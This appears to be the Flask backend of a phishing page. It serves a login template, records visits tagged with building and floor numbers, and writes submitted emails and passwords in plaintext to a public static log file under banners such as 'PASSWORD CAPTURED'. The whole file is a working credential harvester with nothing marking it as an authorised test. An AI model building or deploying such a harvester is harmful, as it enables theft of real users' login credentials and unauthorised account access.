from flask import Flask, render_template, request, abort
import datetime
import base64

app = Flask(__name__)

TIME_OFFSET = datetime.timedelta(hours=6)

def get_local_time():
    return datetime.datetime.now() - TIME_OFFSET

def is_number(s):
    """Return True if s is a non‑negative integer string (no leading zeros allowed beyond '0')."""
    return s is not None and s.isdigit()

ALLOWED_PARAMS = {'u', 'p', 'logo', 'bg', 'edificio', 'planta'}

@app.route('/email', methods=['POST'])
def log_email():
    email = request.form.get('email')
    if email:
        timestamp = get_local_time().strftime('%Y-%m-%d %H:%M:%S')
        ua = request.headers.get('User-Agent')
        with open("./static/log.txt", "a") as f:
            f.write("=" * 30 + "\n")
            f.write(f"!!! EMAIL CAPTURED [{timestamp}] !!!\n")
            f.write(f"Email: {email}\n")
            f.write(f"User-Agent: {ua}\n")
            f.write("=" * 30 + "\n")
        return "Success", 200
    return "Missing Email", 400

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        received_params = set(request.args.keys())
        if not received_params.issubset(ALLOWED_PARAMS):
            abort(404)

        edificio = request.args.get('edificio')
        planta = request.args.get('planta')

        # If both are present, they must be numeric
        if edificio is not None and planta is not None:
            if not (is_number(edificio) and is_number(planta)):
                abort(404)  # non‑numeric values are invalid

            timestamp = get_local_time().strftime('%Y-%m-%d %H:%M:%S')
            ua = request.headers.get('User-Agent')
            with open("./static/log.txt", "a") as f:
                f.write(f"- - - - - - - - - - - - - - - -\n")
                f.write(f"- Visit: {timestamp} -\n")
                f.write(f"- User-Agent: {ua} -\n")
                f.write(f"- Edificio: {edificio} | Planta: {planta} -\n")
                f.write(f"- - - - - - - - - - - - - - - -\n")
        # If one or both are missing, we do not log (but still render the page)

        return render_template('login.html')

    if request.method == 'POST':
        username = request.form.get('u')
        password = request.form.get('p')
        ua = request.headers.get('User-Agent')

        if username and password:
            timestamp = get_local_time().strftime('%Y-%m-%d %H:%M:%S')
            edificio = request.form.get('edificio')
            planta = request.form.get('planta')

            # Validate that if provided, both are numeric
            if edificio is not None or planta is not None:
                if not (is_number(edificio) and is_number(planta)):
                    return "Edificio and Planta must be numeric", 400

            with open("./static/log.txt", "a") as f:
                f.write("=" * 30 + "\n")
                f.write(f"!!! PASSWORD CAPTURED [{timestamp}] !!!\n")
                f.write(f"Email: {username}\n")
                f.write(f"User-Agent: {ua}\n")
                if edificio is not None and planta is not None:
                    f.write(f"Edificio: {edificio} | Planta: {planta}\n")
                f.write("=" * 30 + "\n")
            return "Success", 200

        return "Missing Data", 400

    abort(404)

@app.route('/ToS')
def tos():
    return render_template('tos.html')

@app.errorhandler(404)
def page_not_found(e):
    return "<h1>404 Not Found</h1><p>The requested URL was not found on the server.</p>", 404

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=8081)